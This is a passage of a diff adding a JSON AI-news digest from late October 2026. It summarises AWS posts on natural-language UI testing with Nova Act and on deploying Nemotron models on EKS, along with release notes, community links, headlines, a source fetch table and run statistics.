18-step test workflow, and share best practices and measured results.\n\nThe challenge: Enhancing coverage, not replacing what works\n\nEpsilon’s existing UI testing practice was not broken. The team maintained a Playwright-based regression suite that validated functionality across their web applications, and it worked well. Playwright remains their regression backbone today.\n\nThe opportunity Epsilon identified was additive, not corrective:\n\nScripted Playwright tests are effective for deterministic regression checks. However, they are tightly coupled to selectors and page structure. Cosmetic UI changes can break them even when the underlying functionality is sound.\n\nMultiple product teams needed full testing coverage against their own applications. Standing up browser infrastructure, managing dependencies, and integrating with identity systems per team created duplicative effort.\n\nThe platform team wanted UI testing to be a managed capability that fit their existing agent model, not a custom CLI that every onboarded team had to operate.\n\nThe goal: layer intent-based testing on top of the existing Playwright regression suite. Deliver it as a multi-tenant platform service so that each Epsilon product team could consume through the same API surface they used for every other agent capability.\n\nWhy Epsilon chose Amazon Nova Act and the Amazon Bedrock AgentCore Browser Tool\n\nEpsilon evaluated options against two requirements: natural-language test authoring (to complement selector-based Playwright tests) and managed browser infrastructure (to fit their multi-tenant platform model). With Amazon Nova Act combined with Amazon Bedrock AgentCore Browser Tool, Epsilon could address both.\n\nNatural-language steps. Test steps are plain-English instructions executed by Nova Act. They are resilient to cosmetic UI changes and readable by non-engineers. A step like “Confirm the rewards balance is visible” ages far better than a brittle CSS selector.\n\nAWS managed, ephemeral browser sessions. With Amazon Bedrock AgentCore Browser Tool, teams get isolated browser instances with no binaries to ship and no display server to maintain. Amazon Bedrock AgentCore Browser Tool also offers live view for human observation or takeover (useful for CAPTCHAs or multi-factor authentication), session recording to Amazon Simple Storage Service (Amazon S3), and AWS CloudTrail audit, all without additional configuration.\n\nAWS Identity and Access Management (AWS IAM)-based authentication. With Nova Act, you can authenticate through the standard AWS credential chain (the task role). This fits Epsilon’s existing security model without distributing separate API keys.\n\nCross-account friendly. With Nova Act and Amazon Bedrock AgentCore Browser Tool, you can slot into your existing AWS Security Token Service (AWS STS) AssumeRole provisioning. Each onboarded team can run tests inside their own AWS account under a scoped role. This maintains isolation and auditability.\n\nEpsilon chose Amazon Bedrock AgentCore Browser Tool specifically because it eliminates the operational burden of managing browser binaries, display servers, and session lifecycle. The Agentic Platform team had no interest in owning that infrastructure.\n\nThe solution: Architecture and implementation\n\nEpsilon’s solution has three main components: a platform API for creating workflows, a background task runner for executing them, and the Nova Act and Amazon Bedrock AgentCore Browser Tool integration that drives the browser.\n\nPlatform architecture\n\nEpsilon’s UI testing capability follows a clear pipeline:\n\nA user creates a workflow through the platform API, specifying a target_url and a list of natural-language steps.\n\nOn create, the platform registers a Nova Act workflow definition on AWS.\n\nOn execute, a background task runner ( Celery , a Python framework for asynchronous job processing) opens an Amazon Bedrock AgentCore Browser Tool browser session. It runs each step through Nova Act over a Chrome DevTools Protocol (CDP) WebSocket (the standard interface for programmatically controlling Chromium browsers), including conditional logic (for example, “if a tour box appears, skip it” ).\n\nThe system captures a screenshot per step, tracks pass/fail per step, computes an overall pass rate, and stores everything (results JSON, screenshots in Amazon S3, session ID).\n\nA completion hook fires so the result is recorded back into the platform.\n\nFigure 1: Epsilon’s UI Testing Service architecture\n\nFigure 1 shows the layered architecture of Epsilon’s UI Testing Service. User requests flow from the Agent Cloud Frontend through an API Gateway with authentication and permission checks. The API layer (Django REST) exposes endpoints for workflows, executions, automation suites, and stats. The business logic layer includes a Workflow Manager, Execution Orchestrator, and Suite Coordinator. Test jobs are queued in Amazon Simple Queue Service (Amazon SQS) and picked up by the Runner Service running on Amazon Elastic Container Service (Amazon ECS), which contains the Nova Act engine and a headless Chromium browser. Results, screenshots, trajectories, and HTML reports are stored in Amazon S3.\n\nThe capability is exposed as a standard agent ( ui-test-agent ) with two skills:\n\nui-test-recorder : Explore a scenario interactively and record natural-language steps.\n\nui-test-executor : Run recorded steps and return structured results.\n\nOnboarded teams consume UI testing the same way they consume any other platform agent. No additional infrastructure to manage. The onboarding process is straightforward. The platform team provisions a cross-account IAM role for the new team, registers their target application URLs, and grants access to the ui-test-agent through the existing platform API. From that point, teams create workflows, trigger executions, and retrieve results through the same interface they already use for other platform capabilities.\n\nThe core integration\n\nThe Nova Act + Amazon Bedrock AgentCore Browser Tool integration is concise:\n\nimport boto3\nfrom bedrock_agentcore.tools.browser_client import browser_session\nfrom nova_act import NovaAct\n\nboto_session = boto3.Session(region_name=region)\n\nwith browser_session(region) as client:\nws_url, headers = client.generate_ws_headers()\nwith NovaAct(\ncdp_endpoint_url=ws_url,\ncdp_headers=headers,\nboto_session=boto_session,\nstarting_page=url\n) as nova_act:\nresult = nova_act.act(instruction)\n\nThis pattern (open a managed browser session, connect through the CDP WebSocket, and drive…",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "line": "AWS published reference architectures for deploying NVIDIA's 120B-parameter Nemotron 3.5 Super VL MoE model on Amazon EKS and SageMaker HyperPod.",
+      "item": {
+        "key": "aws.amazon.com/blogs/machine-learning/accelerate-agentic-ai-with-nvidia-nemotron-models-on-amazon-eks-and-sagemaker-hyperpod-eks",
+        "source": "AWS Machine Learning",
+        "tags": [
+          "infra"
+        ],
+        "title": "Accelerate agentic AI with NVIDIA Nemotron models on Amazon EKS and SageMaker HyperPod EKS",
+        "url": "https://aws.amazon.com/blogs/machine-learning/accelerate-agentic-ai-with-nvidia-nemotron-models-on-amazon-eks-and-sagemaker-hyperpod-eks/",
+        "discussion_url": null,
+        "published": "2026-10-29T16:11:08Z",
+        "summary": "NVIDIA Nemotron 3.5 Super VL is a 120B-parameter mixture-of-experts model that pairs reasoning and tool use with multimodal understanding. This post explores its architecture and use cases, then shows how to deploy it on Amazon EKS, EKS Auto Mode, and Amazon SageMaker HyperPod EKS with NVIDIA Dynamo and vLLM.",
+        "content": "NVIDIA Nemotron 3.5 Super VL joins the NVIDIA Nemotron 3 Nano , Nano Omni , Super , Ultra , and Nemotron 3.5 Lightning models already available on AWS. It’s a 120B-parameter mixture-of-experts (MoE) model that activates 12B parameters per token. It combines reasoning and tool use with text, image, document, and video understanding, so one model serves both text and visual tasks. This post explores its architecture and use cases, then shows how to deploy it on Amazon Elastic Kubernetes Service (Amazon EKS) , Amazon EKS Auto Mode , and Amazon SageMaker HyperPod EKS .\n\nAbout Nemotron 3.5 Super VL\n\nNVIDIA Nemotron 3.5 Super VL is an open multimodal model distilled from Nemotron 3 Ultra. NVIDIA publishes the weights, training datasets, and post-training recipes, so you can customize the model for domain-specific workloads and run it on infrastructure you control. Model details:\n\n120B total parameters, 12B active per token.\n\nHybrid Mamba-2, MoE , and attention layers with a RADIO vision encoder.\n\nContext length up to 1M tokens.\n\nInput: text, image, document, and video.\n\nOutput: text.\n\nBF16 and NVFP4 checkpoints.\n\nNVIDIA reports 63.44 percent on Hermes Bench and 87.05 percent on LangChain agent evaluations, and 80.8 percent on the CharXiv chart-reasoning benchmark. ( technical report )\n\nModel architecture\n\nNemotron 3.5 Super VL uses a hybrid Mamba-Transformer MoE architecture, interleaving Mamba-2, attention, and expert layers. Sparse routing activates 12B of the 120B parameters per token, so compute per token matches a much smaller model while GPU memory still holds the full weights. Mamba-2 layers carry a constant-size state during generation, so their memory does not grow with sequence length the way KV cache does, which keeps long contexts affordable. A recursively shared Multi-Token Prediction (MTP) head supports native speculative decoding.\n\nUse cases\n\nNemotron 3.5 Super VL supports agent workflows that combine reasoning with visual understanding:\n\nCoding: test and validate code, analyze errors, recommend fixes.\n\nWeb research: cross-reference and verify sources returned by search tools.\n\nDocument intelligence: read tables, charts, and page layouts to produce summaries.\n\nCyber security: identify vulnerabilities and triage threats.\n\nVideo understanding: search, content, review, and incident analysis.\n\nNemotron 3.5 Super VL integrates with major open agent frameworks and orchestration systems through NVIDIA reference implementations, cookbooks, and the NVIDIA Agent Toolkit . For the full list of supported frameworks, see the NVIDIA developer blog .\n\nMinimum GPU configurations\n\nvLLM (GPU Model / min count)\nBF16\nNVFP4\n\nB200/GB200\n8\n2\n\nB300/GB300\n4\n1\n\nH200\n8\n4\n\nH100\n16\n8\n\nDeployment on AWS\n\nThis section gives an overview of architecture, validation, and performance evaluation approaches. A detailed walkthrough of deploying Nemotron 3.5 Super VL and Nemotron 3 Ultra on AWS is available in the aws-do-eks project, including prerequisites, cluster creation, model weights download, deployment, testing, benchmarking, and cleanup. The same pattern can also be applied to other models in the NVIDIA Nemotron family.\n\nDeployment architecture\n\nThe reference implementation runs on standard Amazon EKS, EKS Auto Mode, and SageMaker HyperPod EKS. With EKS Auto Mode, AWS manages scaling, GPU, and EFA support in the cluster on your behalf. The Kubernetes manifests for model deployment are the same for each of the orchestrator options. Each cluster has a control plane hosting the Kubernetes API and a data plane of CPU and GPU nodes. CPU nodes run system and test pods, while the GPU nodes run the model. Amazon Elastic Container Registry (Amazon ECR) stores the container images, a shared Amazon FSx for Lustre volume holds the model weights, and Elastic Fabric Adapter (EFA) connects the GPU nodes. The following figure shows a standard Amazon EKS cluster.\n\nFigure 1: Standard Amazon EKS cluster architecture for serving NVIDIA Nemotron models\n\nNVIDIA Dynamo serves the model aggregated on a single node or disaggregated with prefill and decode on different nodes. For vision-language models, the image/video encoding stage can in addition run disaggregated on its own node.\n\nValidation and performance\n\nThis architecture has been validated on both p6-b200.48xlarge (8 x NVIDIA B200 GPUs) and p5en.48xlarge (8 x NVIDIA H200 GPUs) instances. You can validate the cluster and its network with an NVIDIA Collective Communications Library (NCCL) all-reduce micro-benchmark.\n\nFigure 2: GPU and EFA utilization during an NCCL all-reduce validation test\n\nSeeing utilization on all GPUs and traffic on all EFA adapters while the NCCL test is running, verifies that the cluster is working as expected.\n\nYou can measure the performance of a deployed model on the cluster with the NVIDIA aiperf tool.\n\nFigure 3: aiperf performance metrics for the deployed model\n\nThe aiperf output in the upper left pane shows key performance indicators (KPIs) like time to first token (TTFT), inter-token latency (ITL), and throughput in tokens per second (TPS). By taking these measurements at various levels of concurrency, we can study how latency and throughput depend on the number of concurrent requests. This information is essential to thoughtfully plan capacity and model deployment topology. The aws-do-eks container provides automation for visualizing GPU and EFA utilization as well as running aiperf and concurrency sweeps with single commands.\n\nFigure 4: Concurrency sweep comparing aggregated and disaggregated deployments\n\nThe preceding concurrency sweep diagram reveals that the inference of Nemotron 3.5 Super VL has lower TTFT and about the same ITL between aggregated and disaggregated deployments on two nodes.\n\nA chart like this is useful when making deployment decisions. Draw your latency budget as horizontal lines, for example TTFT under 600 ms (about 1 second) and ITL under 100 ms per token. The rightmost point under both lines is the throughput one replica of this topology can serve within the service level objective (SLO), here c32, or about 320 tokens per second. To plan capacity, divide your target tokens per second by this per-replica throughput and find the number of prefill-decode pairs to deploy. Re-running the same sweep after a change (precision, TP/PP shape, aggregated versus disaggregated, a new Dynamo or vLLM release) makes the trade-off visible immediately. A curve that moves right and down is a win. Because TTFT and ITL are plotted separately, it also tells you which side to scale: rising ITL says add decode capacity, and rising TTFT says add prefill capacity.\n\nConclusion\n\nThis post covers the architecture and performance evaluation patterns for serving NVIDIA Nemotron models on Amazon EKS, EKS Auto Mode, and SageMaker HyperPod EKS with NVIDIA Dynamo and vLLM. To get started, deploy Nemotron 3.5 Super VL in your own account, using the reference implementation . More inference blueprints are also available in the AI on EKS project. To get further hands-on experience with inference on EKS, register for our upcoming workshops .\n\nAcknowledgements\n\nThe authors would like to convey special thanks to everyone involved in developing, validating, reviewing, and publishing this content, including but not limited to: Eliuth Triana, Jiahong Liu, Kshitiz Gupta, Abhijeet Patil, Mike Stefaniak, Chris Splinter, Sheetal Joshi, Aditya Ramakrishnan, Natarajan Kumar, Anish Maddipoti.\n\nAbout the authors\n\nAlex Iankoulski\n\nAlex is a Principal Solutions Architect in the Worldwide Specialist Organization at AWS. He focuses on orchestration of AI/ML workloads using containers. Alex is the author of the do-framework and a Docker captain who loves applying container technologies to accelerate the pace of innovation while solving the world’s biggest challenges. Over the past 10 years, Alex has worked on helping customers do more on AWS, democratizing AI and ML, combating climate change, and making travel safer, healthcare better…",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "line": "A new project demonstrates automated deduction of a FlashAttention kernel implementation expressed in roughly 25 lines of SQL.",
+      "item": {
+        "key": "github.com/xqlsystems/xarray-sql/blob/6debe2495dcb4e8fac20ab97df5b89baae2a31a6/benchmarks/ml/01_attention.py",
+        "source": "Hacker News front page",
+        "tags": [
+          "community"
+        ],
+        "title": "Show HN: Automatic deduction of FlashAttention kernel from ~25 lines of SQL",
+        "url": "https://github.com/xqlsystems/xarray-sql/blob/6debe2495dcb4e8fac20ab97df5b89baae2a31a6/benchmarks/ml/01_attention.py",
+        "discussion_url": "https://news.ycombinator.com/item?id=50309479",
+        "published": "2026-10-30T20:09:47Z",
+        "summary": "Comments",
+        "content": "",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "line": "Artificial Analysis released edition v5 of its Intelligence Index benchmarking model capabilities and serving economics.",
+      "item": {
+        "key": "artificialanalysis.ai/articles/artificial-analysis-intelligence-index-v5",
+        "source": "Hacker News (AI)",
+        "tags": [
+          "community"
+        ],
+        "title": "Artificial Analysis Intelligence Index v5",
+        "url": "https://artificialanalysis.ai/articles/artificial-analysis-intelligence-index-v5",
+        "discussion_url": "https://news.ycombinator.com/item?id=50268868",
+        "published": "2026-10-28T03:06:22Z",
+        "summary": "",
+        "content": "",
+        "score": 96.0,
+        "comments": 82,
+        "also_in": []
+      }
+    },
+    {
+      "line": "Qwenputer demonstrates a functional, deterministic RISC-V CPU implemented entirely within Qwen3.5.",
+      "item": {
+        "key": "divagr.com/blog/qwenputer",
+        "source": "Lobsters (AI)",
+        "tags": [
+          "community"
+        ],
+        "title": "Qwenputer: a fully functioning, deterministic RISC-V CPU inside Qwen3.5",
+        "url": "https://divagr.com/blog/qwenputer",
+        "discussion_url": "https://lobste.rs/s/zftely/qwenputer_fully_functioning",
+        "published": "2026-10-29T10:00:04Z",
+        "summary": "Comments",
+        "content": "",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "line": "LangChain Core 1.7.2 rolled out, introducing notification metadata helpers and patching an in-place mutation bug inside merge_content.",
+      "item": {
+        "key": "github.com/langchain-ai/langchain/releases/tag/langchain-core%3D%3D1.7.2",
+        "source": "LangChain releases",
+        "tags": [
+          "release",
+          "agents"
+        ],
+        "title": "langchain-core==1.7.2",
+        "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-core%3D%3D1.7.2",
+        "discussion_url": null,
+        "published": "2026-10-29T19:04:31Z",
+        "summary": "Changes since langchain-core==1.7.1\n\nrelease(core): 1.7.2 ( #41562 )\n\nfeat(core): add add_notification_metadata and get_notification_metadata ( #41540 )\n\nfix(core): stop merge_content from changing the first message's content ( #41502 )",
+        "content": "",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    }
+  ],
+  "sign_off": "Until tomorrow, check your authorized_keys and keep your agent tokens scoped.",
+  "slow_day_note": "",
+  "headlines": [
+    {
+      "kicker": "Hardware milestone",
+      "headline": "Google runs Gemma 4 on satellite TPUs in orbit",
+      "blurb": "Google successfully booted satellite TPUs in orbit to generate and transmit an AI response from its Gemma 4 model back to Earth.",
+      "item": {
+        "key": "theverge.com/tech/1023528/google-project-suncatcher-ai-satellite-transmission",
+        "source": "The Verge (AI)",
+        "tags": [
+          "press"
+        ],
+        "title": "Google’s satellite AI server transmits its first response to Earth",
+        "url": "https://www.theverge.com/tech/1023528/google-project-suncatcher-ai-satellite-transmission",
+        "discussion_url": null,
+        "published": "2026-10-30T18:21:38Z",
+        "summary": "Google's AI chip-equipped satellite has generated its first response from space. In a blog post on Friday, Google says it successfully booted up the satellite's Tensor Processing Units (TPUs), allowing the on-board Gemma 4 model to follow through on a prompt to create a haiku about being in space: Blue marble below Data streams in […]",
+        "content": "Google's AI chip-equipped satellite has generated its first response from space. In a blog post on Friday, Google says it successfully booted up the satellite's Tensor Processing Units (TPUs), allowing the on-board Gemma 4 model to follow through on a prompt to create a haiku about being in space:\n\nBlue marble below\n\nData streams in silent grace\n\nStarlight feeds my core. ✨\n\nGoogle says it tried out other space-themed limericks and telemetry prompts as well. The test is part of Google's Project Suncatcher, an experimental initiative that could eventually put AI data centers in space. Google launched the satellite into orbit earlier this …\n\nRead the full story at The Verge.",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "kicker": "Web standards",
+      "headline": "OpenAI adopts shared robots.txt signal for training opt-outs",
+      "blurb": "OpenAI will honor a shared robots.txt signal allowing website operators to communicate training preferences to participating AI providers.",
+      "item": {
+        "key": "openai.com/index/helping-websites-express-ai-training-preferences",
+        "source": "OpenAI News",
+        "tags": [
+          "lab"
+        ],
+        "title": "Making it easier for websites to express AI training preferences",
+        "url": "https://openai.com/index/helping-websites-express-ai-training-preferences",
+        "discussion_url": null,
+        "published": "2026-10-30T09:30:00Z",
+        "summary": "OpenAI will honor a shared robots.txt signal to help website operators communicate their AI training preferences to participating providers.",
+        "content": "",
+        "score": null,
+        "comments": null,
+        "also_in": []
+      }
+    },
+    {
+      "kicker": "Diffusion research",
+      "headline": "Intrinsic Distribution Matching sharpens few-step generation",
+      "blurb": "A new method improves prompt accuracy and fine detail in one-step and few-step text-to-image models using distribution matching distillation.",
+      "item": {
+        "key": "arxiv:2610.39633",
+        "source": "HF Daily Papers",
+        "tags": [
+          "research"
+        ],
+        "title": "Intrinsic Distribution Matching",
+        "url": "https://huggingface.co/papers/2610.39633",
+        "discussion_url": null,
+        "published": "2026-10-30T00:00:00Z",
+        "summary": "One-step and few-step text-to-image generation must accurately render the details specified in the prompt despite limited opportunities for refinement. Distribution matching distillation (DMD) uses score differences to bring the generated distribution closer to a reference distribution. Following prior work, we estimate this difference with internal velocity branches, avoiding a separate fake-score network. We ask whether an explicit moment constraint improves this learned score supervision. A decomposition of the reverse-KL field into a Gaussian moment component and a non-Gaussian residual identifies statistics that can be constrained explicitly. We introduce Intrinsic Distribution Matching (IDM), which retains the full DMD correction and matches feature means and per-coordinate standard deviations using the generator's exponential-moving-average (EMA) copy, requiring no external feature encoder. Experiments use full-parameter and low-rank adaptation (LoRA) tuning on Z-Image-Turbo 6B and Qwen-Image 20B. At two network evaluations, IDM reaches 94.25% and 90.20% on Chinese and English LongText-Bench, the highest scores among the compared methods at this budget. Controlled ablations…",
+        "content": "",
+        "score": 235.0,
+        "comments": 2,
+        "also_in": []
+      }
+    }
+  ],
+  "sources": [
+    {
+      "name": "Hacker News (AI)",
+      "ok": true,
+      "fetched": 50,
+      "kept": 25,
+      "error": ""
+    },
+    {
+      "name": "Hacker News front page",
+      "ok": true,
+      "fetched": 30,
+      "kept": 27,
+      "error": ""
+    },
+    {
+      "name": "Lobsters (AI)",
+      "ok": true,
+      "fetched": 25,
+      "kept": 1,
+      "error": ""
+    },
+    {
+      "name": "HF Daily Papers",
+      "ok": true,
+      "fetched": 31,
+      "kept": 20,
+      "error": ""
+    },
+    {
+      "name": "HF Trending Models",
+      "ok": true,
+      "fetched": 20,
+      "kept": 10,
+      "error": ""
+    },
+    {
+      "name": "Hugging Face Blog",
+      "ok": true,
+      "fetched": 894,
+      "kept": 4,
+      "error": ""
+    },
+    {
+      "name": "OpenAI News",
+      "ok": true,
+      "fetched": 1340,
+      "kept": 7,
+      "error": ""
+    },
+    {
+      "name": "Google DeepMind",
+      "ok": true,
+      "fetched": 100,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Google AI Blog",
+      "ok": true,
+      "fetched": 20,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Google Gemini Blog",
+      "ok": true,
+      "fetched": 20,
+      "kept": 5,
+      "error": ""
+    },
+    {
+      "name": "Google Research",
+      "ok": true,
+      "fetched": 100,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Anthropic News",
+      "ok": true,
+      "fetched": 286,
+      "kept": 1,
+      "error": ""
+    },
+    {
+      "name": "Anthropic Research",
+      "ok": true,
+      "fetched": 191,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Meta AI",
+      "ok": true,
+      "fetched": 88,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Mistral AI",
+      "ok": true,
+      "fetched": 93,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Microsoft Research",
+      "ok": true,
+      "fetched": 10,
+      "kept": 2,
+      "error": ""
+    },
+    {
+      "name": "NVIDIA Developer",
+      "ok": true,
+      "fetched": 100,
+      "kept": 3,
+      "error": ""
+    },
+    {
+      "name": "AWS Machine Learning",
+      "ok": true,
+      "fetched": 20,
+      "kept": 8,
+      "error": ""
+    },
+    {
+      "name": "Cloudflare AI",
+      "ok": true,
+      "fetched": 20,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "PyTorch",
+      "ok": true,
+      "fetched": 10,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "vLLM releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 2,
+      "error": ""
+    },
+    {
+      "name": "llama.cpp releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 2,
+      "error": ""
+    },
+    {
+      "name": "Ollama releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 3,
+      "error": ""
+    },
+    {
+      "name": "Transformers releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 1,
+      "error": ""
+    },
+    {
+      "name": "Triton releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "LangChain releases",
+      "ok": true,
+      "fetched": 10,
+      "kept": 3,
+      "error": ""
+    },
+    {
+      "name": "BAIR Blog",
+      "ok": true,
+      "fetched": 10,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Simon Willison",
+      "ok": true,
+      "fetched": 30,
+      "kept": 7,
+      "error": ""
+    },
+    {
+      "name": "Lilian Weng",
+      "ok": true,
+      "fetched": 53,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Sebastian Raschka",
+      "ok": true,
+      "fetched": 20,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Eugene Yan",
+      "ok": true,
+      "fetched": 212,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Chip Huyen",
+      "ok": true,
+      "fetched": 10,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "Ars Technica",
+      "ok": true,
+      "fetched": 20,
+      "kept": 0,
+      "error": ""
+    },
+    {
+      "name": "The Verge (AI)",
+      "ok": true,
+      "fetched": 10,
+      "kept": 10,
+      "error": ""
+    },
+    {
+      "name": "MIT Technology Review (AI)",
+      "ok": true,
+      "fetched": 10,
+      "kept": 2,
+      "error": ""
+    }
+  ],
+  "stats": {
+    "window_start": "2026-10-27T20:32:15.882135Z",
+    "candidates": 141,
+    "triaged": 141,
+    "enriched": 7,
+    "headline_candidates": 147,
+    "model": "gemini/gemini-3.8-flash",
+    "served_by": [
+      "gemini-3.8-flash (key 1)",
+      "gemini-3.7-flash (key 1)",
+      "gemini-3.7-flash (key 1)"
+    ],
+    "seconds": 523.2,
+    "usage": {
+      "calls": 3,
+      "input_tokens": 30567,
+      "output_tokens": 12110,
+      "cost_usd": 0.068338
+    }
+  }
+}
